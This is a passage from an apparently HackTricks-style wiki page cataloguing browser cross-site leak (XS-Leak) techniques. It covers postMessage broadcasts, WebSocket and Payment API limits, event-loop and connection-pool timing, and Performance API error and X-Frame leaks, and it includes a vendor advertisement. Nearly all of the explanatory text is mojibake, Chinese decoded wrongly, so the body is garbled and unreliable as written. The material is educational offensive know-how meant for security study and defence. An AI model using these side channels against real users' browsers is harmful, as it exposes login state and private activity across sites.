å¯ä»¥**åœ¨ä¸€ä¸ª iframe** ä¸­**åŠ è½½ä¸€ä¸ªé¡µé¢**å¹¶ä½¿ç”¨ **`#id_value`** ä½¿é¡µé¢**èšç„¦äº**æŒ‡å®šçš„ iframe å…ƒç´ ï¼Œç„¶åå¦‚æœè§¦å‘äº†**`onblur`** ä¿¡å·ï¼Œåˆ™ ID å…ƒç´ å­˜åœ¨ã€‚\
æ‚¨å¯ä»¥ä½¿ç”¨ **`portal`** æ ‡ç­¾æ‰§è¡Œç›¸åŒçš„æ”»å‡»ã€‚

### postMessage Broadcasts <a href="#postmessage-broadcasts" id="postmessage-broadcasts"></a>

* **Inclusion Methods**: Frames, Pop-ups
* **Detectable Difference**: API Usage
* **More info**: [https://xsleaks.dev/docs/attacks/postmessage-broadcasts/](https://xsleaks.dev/docs/attacks/postmessage-broadcasts/)
* **Summary**: ä» postMessage æ”¶é›†æ•æ„Ÿä¿¡æ¯æˆ–ä½¿ç”¨ postMessages çš„å­˜åœ¨ä½œä¸º oracle æ¥äº†è§£ç”¨æˆ·åœ¨é¡µé¢ä¸Šçš„çŠ¶æ€
* **Code Example**: `ä»»ä½•ç›‘å¬æ‰€æœ‰ postMessages çš„ä»£ç ã€‚`

åº”ç”¨ç¨‹åºç»å¸¸åˆ©ç”¨ [`postMessage` å¹¿æ’­](https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage) åœ¨ä¸åŒæºä¹‹é—´è¿›è¡Œé€šä¿¡ã€‚ç„¶è€Œï¼Œå¦‚æœ `targetOrigin` å‚æ•°æœªæ­£ç¡®æŒ‡å®šï¼Œè¿™ç§æ–¹æ³•å¯èƒ½ä¼šæ— æ„ä¸­æš´éœ²**æ•æ„Ÿä¿¡æ¯**ï¼Œå…è®¸ä»»ä½•çª—å£æ¥æ”¶æ¶ˆæ¯ã€‚æ­¤å¤–ï¼Œæ¥æ”¶æ¶ˆæ¯çš„è¡Œä¸ºæœ¬èº«å¯ä»¥å……å½“**oracle**ï¼›ä¾‹å¦‚ï¼ŒæŸäº›æ¶ˆæ¯å¯èƒ½ä»…å‘é€ç»™å·²ç™»å½•çš„ç”¨æˆ·ã€‚å› æ­¤ï¼Œè¿™äº›æ¶ˆæ¯çš„å­˜åœ¨æˆ–ç¼ºå¤±å¯ä»¥æ­ç¤ºæœ‰å…³ç”¨æˆ·çŠ¶æ€æˆ–èº«ä»½çš„ä¿¡æ¯ï¼Œä¾‹å¦‚ä»–ä»¬æ˜¯å¦ç»è¿‡èº«ä»½éªŒè¯ã€‚

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

ä½¿ç”¨ [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_content=xs-search) è½»æ¾æ„å»ºå’Œ**è‡ªåŠ¨åŒ–å·¥ä½œæµ**ï¼Œç”±ä¸–ç•Œä¸Š**æœ€å…ˆè¿›**çš„ç¤¾åŒºå·¥å…·æä¾›æ”¯æŒã€‚\
ç«‹å³è·å–è®¿é—®æƒé™ï¼š

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=xs-search" %}

## Global Limits Techniques

### WebSocket API

* **Inclusion Methods**: Frames, Pop-ups
* **Detectable Difference**: API Usage
* **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.1)
* **Summary**: è€—å°½ WebSocket è¿æ¥é™åˆ¶ä¼šæ³„éœ²è·¨æºé¡µé¢çš„ WebSocket è¿æ¥æ•°é‡ã€‚
* **Code Example**: [https://xsinator.com/testing.html#WebSocket%20Leak%20(FF)](https://xsinator.com/testing.html#WebSocket%20Leak%20\(FF\)), [https://xsinator.com/testing.html#WebSocket%20Leak%20(GC)](https://xsinator.com/testing.html#WebSocket%20Leak%20\(GC\))

å¯ä»¥è¯†åˆ«ç›®æ ‡é¡µé¢ä½¿ç”¨çš„**WebSocket è¿æ¥**çš„æ•°é‡ã€‚å®ƒå…è®¸æ”»å‡»è€…æ£€æµ‹åº”ç”¨ç¨‹åºçŠ¶æ€å¹¶æ³„éœ²ä¸ WebSocket è¿æ¥æ•°é‡ç›¸å…³çš„ä¿¡æ¯ã€‚

å¦‚æœä¸€ä¸ª**æº**ä½¿ç”¨**æœ€å¤§æ•°é‡çš„ WebSocket**è¿æ¥å¯¹è±¡ï¼Œæ— è®ºå…¶è¿æ¥çŠ¶æ€å¦‚ä½•ï¼Œåˆ›å»º**æ–°å¯¹è±¡å°†å¯¼è‡´ JavaScript å¼‚å¸¸**ã€‚è¦æ‰§è¡Œæ­¤æ”»å‡»ï¼Œæ”»å‡»è€…ç½‘ç«™åœ¨å¼¹å‡ºçª—å£æˆ– iframe ä¸­æ‰“å¼€ç›®æ ‡ç½‘ç«™ï¼Œç„¶ååœ¨ç›®æ ‡ç½‘é¡µåŠ è½½åï¼Œå°è¯•åˆ›å»ºå°½å¯èƒ½å¤šçš„ WebSocket è¿æ¥ã€‚**æŠ›å‡ºçš„å¼‚å¸¸æ•°é‡**å°±æ˜¯ç›®æ ‡ç½‘ç«™çª—å£ä½¿ç”¨çš„**WebSocket è¿æ¥æ•°é‡**ã€‚

### Payment API

* **Inclusion Methods**: Frames, Pop-ups
* **Detectable Difference**: API Usage
* **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.1)
* **Summary**: æ£€æµ‹æ”¯ä»˜è¯·æ±‚ï¼Œå› ä¸ºä¸€æ¬¡åªèƒ½æ¿€æ´»ä¸€ä¸ªã€‚
* **Code Example**: [https://xsinator.com/testing.html#Payment%20API%20Leak](https://xsinator.com/testing.html#Payment%20API%20Leak)

æ­¤ XS-Leak ä½¿æ”»å‡»è€…èƒ½å¤Ÿ**æ£€æµ‹è·¨æºé¡µé¢ä½•æ—¶å‘èµ·æ”¯ä»˜è¯·æ±‚**ã€‚

å› ä¸º**ä¸€æ¬¡åªèƒ½æ¿€æ´»ä¸€ä¸ªæ”¯ä»˜è¯·æ±‚**ï¼Œå¦‚æœç›®æ ‡ç½‘ç«™æ­£åœ¨ä½¿ç”¨æ”¯ä»˜è¯·æ±‚ APIï¼Œä»»ä½•è¿›ä¸€æ­¥å°è¯•ä½¿ç”¨æ­¤ API çš„è¯·æ±‚å°†å¤±è´¥ï¼Œå¹¶å¯¼è‡´**JavaScript å¼‚å¸¸**ã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡**å®šæœŸå°è¯•æ˜¾ç¤ºæ”¯ä»˜ API UI**æ¥åˆ©ç”¨è¿™ä¸€ç‚¹ã€‚å¦‚æœä¸€æ¬¡å°è¯•å¯¼è‡´å¼‚å¸¸ï¼Œåˆ™ç›®æ ‡ç½‘ç«™å½“å‰æ­£åœ¨ä½¿ç”¨å®ƒã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡åœ¨åˆ›å»ºåç«‹å³å…³é—­ UI æ¥éšè—è¿™äº›å®šæœŸå°è¯•ã€‚

### Timing the Event Loop <a href="#timing-the-event-loop" id="timing-the-event-loop"></a>

* **Inclusion Methods**:
* **Detectable Difference**: Timing (generally due to Page Content, Status Code)
* **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#timing-the-event-loop](https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#timing-the-event-loop)
* **Summary:** æµ‹é‡ä¸€ä¸ªç½‘é¡µçš„æ‰§è¡Œæ—¶é—´ï¼Œåˆ©ç”¨å•çº¿ç¨‹çš„ JS äº‹ä»¶å¾ªç¯ã€‚
* **Code Example**:

{% content-ref url="event-loop-blocking-+-lazy-images.md" %}
[event-loop-blocking-+-lazy-images.md](event-loop-blocking-+-lazy-images.md)
{% endcontent-ref %}

JavaScript åœ¨ [å•çº¿ç¨‹äº‹ä»¶å¾ªç¯](https://developer.mozilla.org/en-US/docs/Web/JavaScript/EventLoop) å¹¶å‘æ¨¡å‹ä¸Šè¿è¡Œï¼Œè¿™æ„å‘³ç€**å®ƒä¸€æ¬¡åªèƒ½æ‰§è¡Œä¸€ä¸ªä»»åŠ¡**ã€‚è¿™ä¸€ç‰¹æ€§å¯ä»¥è¢«åˆ©ç”¨æ¥è¯„ä¼°**æ¥è‡ªä¸åŒæºçš„ä»£ç æ‰§è¡Œæ‰€éœ€çš„æ—¶é—´**ã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡ä¸æ–­è°ƒåº¦å…·æœ‰å›ºå®šå±æ€§çš„äº‹ä»¶æ¥æµ‹é‡å…¶ä»£ç åœ¨äº‹ä»¶å¾ªç¯ä¸­çš„æ‰§è¡Œæ—¶é—´ã€‚è¿™äº›äº‹ä»¶å°†åœ¨äº‹ä»¶æ± ä¸ºç©ºæ—¶è¢«å¤„ç†ã€‚å¦‚æœå…¶ä»–æºä¹Ÿåœ¨å‘åŒä¸€æ± è°ƒåº¦äº‹ä»¶ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡è§‚å¯Ÿè‡ªå·±ä»»åŠ¡æ‰§è¡Œçš„å»¶è¿Ÿæ¥æ¨æ–­è¿™äº›å¤–éƒ¨äº‹ä»¶æ‰§è¡Œæ‰€éœ€çš„æ—¶é—´ã€‚è¿™ç§ç›‘æ§äº‹ä»¶å¾ªç¯å»¶è¿Ÿçš„æ–¹æ³•å¯ä»¥æ­ç¤ºæ¥è‡ªä¸åŒæºçš„ä»£ç çš„æ‰§è¡Œæ—¶é—´ï¼Œå¯èƒ½ä¼šæš´éœ²æ•æ„Ÿä¿¡æ¯ã€‚

{% hint style="warning" %}
åœ¨æ‰§è¡Œæ—¶é—´æµ‹é‡ä¸­ï¼Œå¯ä»¥**æ¶ˆé™¤** **ç½‘ç»œå› ç´ **ä»¥è·å¾—**æ›´ç²¾ç¡®çš„æµ‹é‡**ã€‚ä¾‹å¦‚ï¼Œé€šè¿‡åœ¨åŠ è½½é¡µé¢ä¹‹å‰åŠ è½½æ‰€ä½¿ç”¨çš„èµ„æºã€‚
{% endhint %}

### Busy Event Loop <a href="#busy-event-loop" id="busy-event-loop"></a>

* **Inclusion Methods**:
* **Detectable Difference**: Timing (generally due to Page Content, Status Code)
* **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#busy-event-loop](https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#busy-event-loop)
* **Summary:** ä¸€ç§æµ‹é‡ç½‘é¡µæ“ä½œæ‰§è¡Œæ—¶é—´çš„æ–¹æ³•æ˜¯æ•…æ„é˜»å¡çº¿ç¨‹çš„äº‹ä»¶å¾ªç¯ï¼Œç„¶åè®¡æ—¶**äº‹ä»¶å¾ªç¯å†æ¬¡å¯ç”¨æ‰€éœ€çš„æ—¶é—´**ã€‚é€šè¿‡åœ¨äº‹ä»¶å¾ªç¯ä¸­æ’å…¥é˜»å¡æ“ä½œï¼ˆä¾‹å¦‚é•¿æ—¶é—´è®¡ç®—æˆ–åŒæ­¥ API è°ƒç”¨ï¼‰ï¼Œå¹¶ç›‘æ§åç»­ä»£ç å¼€å§‹æ‰§è¡Œæ‰€éœ€çš„æ—¶é—´ï¼Œå¯ä»¥æ¨æ–­å‡ºåœ¨é˜»å¡æœŸé—´äº‹ä»¶å¾ªç¯ä¸­æ‰§è¡Œçš„ä»»åŠ¡çš„æŒç»­æ—¶é—´ã€‚è¿™ç§æŠ€æœ¯åˆ©ç”¨äº† JavaScript äº‹ä»¶å¾ªç¯çš„å•çº¿ç¨‹ç‰¹æ€§ï¼Œå…¶ä¸­ä»»åŠ¡æ˜¯é¡ºåºæ‰§è¡Œçš„ï¼Œå¹¶ä¸”å¯ä»¥æä¾›æœ‰å…³å…±äº«åŒä¸€çº¿ç¨‹çš„å…¶ä»–æ“ä½œçš„æ€§èƒ½æˆ–è¡Œä¸ºçš„è§è§£ã€‚
* **Code Example**:

é€šè¿‡é”å®šäº‹ä»¶å¾ªç¯æ¥æµ‹é‡æ‰§è¡Œæ—¶é—´çš„æŠ€æœ¯çš„ä¸€ä¸ªæ˜¾è‘—ä¼˜åŠ¿æ˜¯å…¶æ½œåœ¨çš„ç»•è¿‡**ç«™ç‚¹éš”ç¦»**ã€‚**ç«™ç‚¹éš”ç¦»**æ˜¯ä¸€ç§å®‰å…¨åŠŸèƒ½ï¼Œå°†ä¸åŒç½‘ç«™åˆ†éš”åˆ°ä¸åŒçš„è¿›ç¨‹ä¸­ï¼Œæ—¨åœ¨é˜²æ­¢æ¶æ„ç½‘ç«™ç›´æ¥è®¿é—®å…¶ä»–ç½‘ç«™çš„æ•æ„Ÿæ•°æ®ã€‚ç„¶è€Œï¼Œé€šè¿‡é€šè¿‡å…±äº«äº‹ä»¶å¾ªç¯å½±å“å¦ä¸€ä¸ªæºçš„æ‰§è¡Œæ—¶é—´ï¼Œæ”»å‡»è€…å¯ä»¥é—´æ¥æå–æœ‰å…³è¯¥æºæ´»åŠ¨çš„ä¿¡æ¯ã€‚è¿™ç§æ–¹æ³•ä¸ä¾èµ–äºç›´æ¥è®¿é—®å…¶ä»–æºçš„æ•°æ®ï¼Œè€Œæ˜¯è§‚å¯Ÿè¯¥æºæ´»åŠ¨å¯¹å…±äº«äº‹ä»¶å¾ªç¯çš„å½±å“ï¼Œä»è€Œè§„é¿**ç«™ç‚¹éš”ç¦»**å»ºç«‹çš„ä¿æŠ¤å±éšœã€‚

{% hint style="warning" %}
åœ¨æ‰§è¡Œæ—¶é—´æµ‹é‡ä¸­ï¼Œå¯ä»¥**æ¶ˆé™¤** **ç½‘ç»œå› ç´ **ä»¥è·å¾—**æ›´ç²¾ç¡®çš„æµ‹é‡**ã€‚ä¾‹å¦‚ï¼Œé€šè¿‡åœ¨åŠ è½½é¡µé¢ä¹‹å‰åŠ è½½æ‰€ä½¿ç”¨çš„èµ„æºã€‚
{% endhint %}

### Connection Pool

* **Inclusion Methods**: JavaScript Requests
* **Detectable Difference**: Timing (generally due to Page Content, Status Code)
* **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/](https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/)
* **Summary:** æ”»å‡»è€…å¯ä»¥é”å®šæ‰€æœ‰å¥—æ¥å­—ï¼Œé™¤äº† 1 ä¸ªï¼ŒåŠ è½½ç›®æ ‡ç½‘é¡µï¼ŒåŒæ—¶åŠ è½½å¦ä¸€ä¸ªé¡µé¢ï¼Œç›´åˆ°æœ€åä¸€ä¸ªé¡µé¢å¼€å§‹åŠ è½½çš„æ—¶é—´å°±æ˜¯ç›®æ ‡é¡µé¢åŠ è½½æ‰€éœ€çš„æ—¶é—´ã€‚
* **Code Example**:

{% content-ref url="connection-pool-example.md" %}
[connection-pool-example.md](connection-pool-example.md)
{% endcontent-ref %}

æµè§ˆå™¨åˆ©ç”¨å¥—æ¥å­—è¿›è¡ŒæœåŠ¡å™¨é€šä¿¡ï¼Œä½†ç”±äºæ“ä½œç³»ç»Ÿå’Œç¡¬ä»¶çš„èµ„æºæœ‰é™ï¼Œ**æµè§ˆå™¨è¢«è¿«æ–½åŠ é™åˆ¶**ï¼Œé™åˆ¶å¹¶å‘å¥—æ¥å­—çš„æ•°é‡ã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡ä»¥ä¸‹æ­¥éª¤åˆ©ç”¨è¿™ä¸€é™åˆ¶ï¼š

1. ç¡®å®šæµè§ˆå™¨çš„å¥—æ¥å­—é™åˆ¶ï¼Œä¾‹å¦‚ï¼Œ256 ä¸ªå…¨å±€å¥—æ¥å­—ã€‚
2. é€šè¿‡å‘ä¸åŒä¸»æœºå‘èµ· 255 ä¸ªè¯·æ±‚ï¼Œé•¿æ—¶é—´å ç”¨ 255 ä¸ªå¥—æ¥å­—ï¼Œæ—¨åœ¨ä¿æŒè¿æ¥å¼€æ”¾è€Œä¸å®Œæˆã€‚
3. ä½¿ç”¨ç¬¬ 256 ä¸ªå¥—æ¥å­—å‘ç›®æ ‡é¡µé¢å‘é€è¯·æ±‚ã€‚
4. å°è¯•å‘å¦ä¸€ä¸ªä¸»æœºå‘èµ·ç¬¬ 257 ä¸ªè¯·æ±‚ã€‚ç”±äºæ‰€æœ‰å¥—æ¥å­—éƒ½åœ¨ä½¿ç”¨ä¸­ï¼ˆæ ¹æ®æ­¥éª¤ 2 å’Œ 3ï¼‰ï¼Œæ­¤è¯·æ±‚å°†è¢«æ’é˜Ÿï¼Œç›´åˆ°æœ‰å¥—æ¥å­—å¯ç”¨ã€‚æ­¤è¯·æ±‚è¿›è¡Œä¹‹å‰çš„å»¶è¿Ÿä¸ºæ”»å‡»è€…æä¾›äº†ä¸ç¬¬ 256 ä¸ªå¥—æ¥å­—ï¼ˆç›®æ ‡é¡µé¢çš„å¥—æ¥å­—ï¼‰ç›¸å…³çš„ç½‘ç»œæ´»åŠ¨çš„æ—¶é—´ä¿¡æ¯ã€‚è¿™ç§æ¨æ–­æ˜¯å¯èƒ½çš„ï¼Œå› ä¸ºæ­¥éª¤ 2 ä¸­çš„ 255 ä¸ªå¥—æ¥å­—ä»åœ¨ä½¿ç”¨ï¼Œè¿™æ„å‘³ç€ä»»ä½•æ–°å¯ç”¨çš„å¥—æ¥å­—å¿…é¡»æ˜¯æ­¥éª¤ 3 ä¸­é‡Šæ”¾çš„å¥—æ¥å­—ã€‚å› æ­¤ï¼Œç¬¬ 256 ä¸ªå¥—æ¥å­—å˜ä¸ºå¯ç”¨æ‰€éœ€çš„æ—¶é—´ä¸è¯·æ±‚ç›®æ ‡é¡µé¢å®Œæˆæ‰€éœ€çš„æ—¶é—´ç›´æ¥ç›¸å…³ã€‚

æ›´å¤šä¿¡æ¯è¯·å‚è§ï¼š[https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/](https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/)

### Connection Pool by Destination

* **Inclusion Methods**: JavaScript Requests
* **Detectable Difference**: Timing (generally due to Page Content, Status Code)
* **More info**:
* **Summary:** è¿™ä¸å‰ä¸€ç§æŠ€æœ¯ç±»ä¼¼ï¼Œä½† Google **Chrome** å¯¹**åŒä¸€æºçš„å¹¶å‘è¯·æ±‚**è®¾ç½®äº†**6 ä¸ªé™åˆ¶**ã€‚å¦‚æœæˆ‘ä»¬**é˜»å¡ 5 ä¸ª**ï¼Œç„¶å**å‘èµ·ç¬¬ 6 ä¸ª**è¯·æ±‚ï¼Œæˆ‘ä»¬å¯ä»¥**è®¡æ—¶**ï¼Œå¦‚æœæˆ‘ä»¬è®¾æ³•è®©**å—å®³è€…é¡µé¢å‘é€**æ›´å¤š**è¯·æ±‚**åˆ°åŒä¸€ç«¯ç‚¹ä»¥æ£€æµ‹é¡µé¢çš„**çŠ¶æ€**ï¼Œç¬¬ **6 ä¸ªè¯·æ±‚**å°†éœ€è¦**æ›´é•¿æ—¶é—´**ï¼Œæˆ‘ä»¬å¯ä»¥æ£€æµ‹åˆ°ã€‚

## Performance API Techniques

[`Performance API`](https://developer.mozilla.org/en-US/docs/Web/API/Performance) æä¾›äº†å¯¹ Web åº”ç”¨ç¨‹åºæ€§èƒ½æŒ‡æ ‡çš„æ´å¯Ÿï¼Œè¿›ä¸€æ­¥é€šè¿‡ [`Resource Timing API`](https://developer.mozilla.org/en-US/docs/Web/API/Resource\_Timing\_API) å¾—åˆ°å¢å¼ºã€‚èµ„æºè®¡æ—¶ API ä½¿ç›‘æ§è¯¦ç»†çš„ç½‘ç»œè¯·æ±‚æ—¶åºæˆä¸ºå¯èƒ½ï¼Œä¾‹å¦‚è¯·æ±‚çš„æŒç»­æ—¶é—´ã€‚å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œå½“æœåŠ¡å™¨åœ¨å…¶å“åº”ä¸­åŒ…å« `Timing-Allow-Origin: *` å¤´æ—¶ï¼Œä¼ è¾“å¤§å°å’ŒåŸŸæŸ¥æ‰¾æ—¶é—´ç­‰é™„åŠ æ•°æ®å°†å˜å¾—å¯ç”¨ã€‚

è¿™äº›æ•°æ®å¯ä»¥é€šè¿‡ [`performance.getEntries`](https://developer.mozilla.org/en-US/docs/Web/API/Performance/getEntries) æˆ– [`performance.getEntriesByName`](https://developer.mozilla.org/en-US/docs/Web/API/Performance/getEntriesByName) ç­‰æ–¹æ³•æ£€ç´¢ï¼Œæä¾›å…¨é¢çš„æ€§èƒ½ç›¸å…³ä¿¡æ¯ã€‚æ­¤å¤–ï¼ŒAPI è¿˜é€šè¿‡è®¡ç®—ä» [`performance.now()`](https://developer.mozilla.org/en-US/docs/Web/API/Performance/now) è·å–çš„æ—¶é—´æˆ³ä¹‹é—´çš„å·®å¼‚æ¥æµ‹é‡æ‰§è¡Œæ—¶é—´ã€‚ç„¶è€Œï¼Œå€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œå¯¹äº Chrome ç­‰æµè§ˆå™¨ä¸­çš„æŸäº›æ“ä½œï¼Œ`performance.now()` çš„ç²¾åº¦å¯èƒ½ä»…é™äºæ¯«ç§’ï¼Œè¿™å¯èƒ½ä¼šå½±å“æ—¶é—´æµ‹é‡çš„ç²’åº¦ã€‚

é™¤äº†æ—¶é—´æµ‹é‡å¤–ï¼ŒPerformance API è¿˜å¯ä»¥ç”¨äºå®‰å…¨ç›¸å…³çš„æ´å¯Ÿã€‚ä¾‹å¦‚ï¼ŒChrome ä¸­ `performance` å¯¹è±¡ä¸­é¡µé¢çš„å­˜åœ¨æˆ–ç¼ºå¤±å¯ä»¥æŒ‡ç¤º `X-Frame-Options` çš„åº”ç”¨ã€‚å…·ä½“è€Œè¨€ï¼Œå¦‚æœç”±äº `X-Frame-Options` è€Œé˜»æ­¢é¡µé¢åœ¨æ¡†æ¶ä¸­å‘ˆç°ï¼Œåˆ™ä¸ä¼šåœ¨ `performance` å¯¹è±¡ä¸­è®°å½•è¯¥é¡µé¢ï¼Œä»è€Œæä¾›æœ‰å…³é¡µé¢æ¡†æ¶ç­–ç•¥çš„å¾®å¦™çº¿ç´¢ã€‚

### Error Leak

* **Inclusion Methods**: Frames, HTML Elements
* **Detectable Difference**: Status Code
* **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Summary:** ç»“æœä¸ºé”™è¯¯çš„è¯·æ±‚ä¸ä¼šåˆ›å»ºèµ„æºè®¡æ—¶æ¡ç›®ã€‚
* **Code Example**: [https://xsinator.com/testing.html#Performance%20API%20Error%20Leak](https://xsinator.com/testing.html#Performance%20API%20Error%20Leak)

å¯ä»¥**åŒºåˆ† HTTP å“åº”çŠ¶æ€ç **ï¼Œå› ä¸ºå¯¼è‡´**é”™è¯¯**çš„è¯·æ±‚**ä¸ä¼šåˆ›å»ºæ€§èƒ½æ¡ç›®**ã€‚

### Style Reload Error

* **Inclusion Methods**: HTML Elements
* **Detectable Difference**: Status Code
* **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Summary:** ç”±äºæµè§ˆå™¨é”™è¯¯ï¼Œå¯¼è‡´é”™è¯¯çš„è¯·æ±‚ä¼šè¢«åŠ è½½ä¸¤æ¬¡ã€‚
* **Code Example**: [https://xsinator.com/testing.html#Style%20Reload%20Error%20Leak](https://xsinator.com/testing.html#Style%20Reload%20Error%20Leak)

åœ¨å‰ä¸€ç§æŠ€æœ¯ä¸­ï¼Œè¿˜è¯†åˆ«å‡ºæµè§ˆå™¨ä¸­çš„ä¸¤ä¸ªæ¡ˆä¾‹ï¼Œå¯¼è‡´**èµ„æºåœ¨åŠ è½½å¤±è´¥æ—¶è¢«åŠ è½½ä¸¤æ¬¡**ã€‚è¿™å°†å¯¼è‡´æ€§èƒ½ API ä¸­å‡ºç°å¤šä¸ªæ¡ç›®ï¼Œå› æ­¤å¯ä»¥è¢«æ£€æµ‹åˆ°ã€‚

### Request Merging Error

* **Inclusion Methods**: HTML Elements
* **Detectable Difference**: Status Code
* **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Summary:** å¯¼è‡´é”™è¯¯çš„è¯·æ±‚æ— æ³•åˆå¹¶ã€‚
* **Code Example**: [https://xsinator.com/testing.html#Request%20Merging%20Error%20Leak](https://xsinator.com/testing.html#Request%20Merging%20Error%20Leak)

è¯¥æŠ€æœ¯åœ¨æåˆ°çš„è®ºæ–‡ä¸­çš„è¡¨æ ¼ä¸­è¢«å‘ç°ï¼Œä½†æ²¡æœ‰æ‰¾åˆ°è¯¥æŠ€æœ¯çš„æè¿°ã€‚ç„¶è€Œï¼Œæ‚¨å¯ä»¥åœ¨ [https://xsinator.com/testing.html#Request%20Merging%20Error%20Leak](https://xsinator.com/testing.html#Request%20Merging%20Error%20Leak) ä¸­æ£€æŸ¥æºä»£ç ã€‚

### Empty Page Leak

* **Inclusion Methods**: Frames
* **Detectable Difference**: Page Content
* **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Summary:** ç©ºå“åº”ä¸ä¼šåˆ›å»ºèµ„æºè®¡æ—¶æ¡ç›®ã€‚
* **Code Example**: [https://xsinator.com/testing.html#Performance%20API%20Empty%20Page%20Leak](https://xsinator.com/testing.html#Performance%20API%20Empty%20Page%20Leak)

æ”»å‡»è€…å¯ä»¥æ£€æµ‹è¯·æ±‚æ˜¯å¦å¯¼è‡´ç©º HTTP å“åº”ä½“ï¼Œå› ä¸º**ç©ºé¡µé¢åœ¨æŸäº›æµè§ˆå™¨ä¸­ä¸ä¼šåˆ›å»ºæ€§èƒ½æ¡ç›®**ã€‚

### **XSS-Auditor Leak**

* **Inclusion Methods**: Frames
* **Detectable Difference**: Page Content
* **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Summary:** åœ¨å®‰å…¨å£°æ˜ä¸­ä½¿ç”¨ XSS å®¡è®¡å™¨ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡è§‚å¯Ÿåœ¨æ„é€ çš„æœ‰æ•ˆè´Ÿè½½è§¦å‘å®¡è®¡å™¨çš„è¿‡æ»¤æœºåˆ¶æ—¶å“åº”çš„å˜åŒ–æ¥æ£€æµ‹ç‰¹å®šç½‘é¡µå…ƒç´ ã€‚
* **Code Example**: [https://xsinator.com/testing.html#Performance%20API%20XSS%20Auditor%20Leak](https://xsinator.com/testing.html#Performance%20API%20XSS%20Auditor%20Leak)

åœ¨å®‰å…¨å£°æ˜ (SA) ä¸­ï¼ŒXSS å®¡è®¡å™¨æœ€åˆæ—¨åœ¨é˜²æ­¢è·¨ç«™è„šæœ¬ (XSS) æ”»å‡»ï¼Œä½†å¯ä»¥æ‚–è®ºåœ°è¢«åˆ©ç”¨æ¥æ³„éœ²æ•æ„Ÿä¿¡æ¯ã€‚å°½ç®¡æ­¤å†…ç½®åŠŸèƒ½å·²ä» Google Chrome (GC) ä¸­åˆ é™¤ï¼Œä½†åœ¨ SA ä¸­ä»ç„¶å­˜åœ¨ã€‚2013 å¹´ï¼ŒBraun å’Œ Heiderich è¯æ˜ XSS å®¡è®¡å™¨å¯èƒ½ä¼šæ„å¤–é˜»æ­¢åˆæ³•è„šæœ¬ï¼Œå¯¼è‡´è¯¯æŠ¥ã€‚åœ¨æ­¤åŸºç¡€ä¸Šï¼Œç ”ç©¶äººå‘˜å¼€å‘äº†æå–ä¿¡æ¯å’Œæ£€æµ‹è·¨æºé¡µé¢ç‰¹å®šå†…å®¹çš„æŠ€æœ¯ï¼Œè¿™ä¸€æ¦‚å¿µè¢«ç§°ä¸º XS-Leaksï¼Œæœ€åˆç”± Terada æŠ¥å‘Šï¼Œå¹¶ç”± Heyes åœ¨åšå®¢æ–‡ç« ä¸­è¯¦ç»†é˜è¿°ã€‚å°½ç®¡è¿™äº›æŠ€æœ¯ç‰¹å®šäº GC ä¸­çš„ XSS å®¡è®¡å™¨ï¼Œä½†å‘ç° SA ä¸­è¢« XSS å®¡è®¡å™¨é˜»æ­¢çš„é¡µé¢ä¸ä¼šåœ¨æ€§èƒ½ API ä¸­ç”Ÿæˆæ¡ç›®ï¼Œä»è€Œæ­ç¤ºäº†ä¸€ç§å¯èƒ½ä»ç„¶æ³„éœ²æ•æ„Ÿä¿¡æ¯çš„æ–¹æ³•ã€‚

### X-Frame Leak

* **Inclusion Methods**: Frames
* **Detectable Difference**: Header
* **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2), [https://xsleaks.github.io/xsleaks/examples/x-frame/index.html](https://xsleaks.github.io/xsleaks/examples/x-frame/index.html), [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-x-frame-options](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-x-frame-options)
* **Summary:** å¸¦æœ‰ X-Frame-Options å¤´çš„èµ„æºä¸ä¼šåˆ›å»ºèµ„æºè®¡æ—¶æ¡ç›®ã€‚
* **Code Example**: [https://xsinator.com/testing.html#Performance%20API%20X-Frame%20Leak](https://xsinator.com/testing.html#Performance%20API%20X-Frame%20Leak)

å¦‚æœé¡µé¢**ä¸å…è®¸**åœ¨**iframe**ä¸­**å‘ˆç°**ï¼Œåˆ™ä¸ä¼šåˆ›å»ºæ€§èƒ½æ¡ç›®ã€‚å› æ­¤ï¼Œæ”»å‡»è€…å¯ä»¥æ£€æµ‹å“åº”å¤´**`X-Frame-Options`**ã€‚\
ä½¿ç”¨**embed** **æ ‡ç­¾**æ—¶ä¹Ÿæ˜¯å¦‚æ­¤ã€‚

### Download Detection

* **Inclusion Methods**: Frames
* **Detectable Difference**: Header
* **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Summary:** ä¸‹è½½ä¸ä¼šåœ¨æ€§èƒ½ API ä¸­åˆ›å»ºèµ„æºè®¡æ—¶æ¡ç›®ã€‚
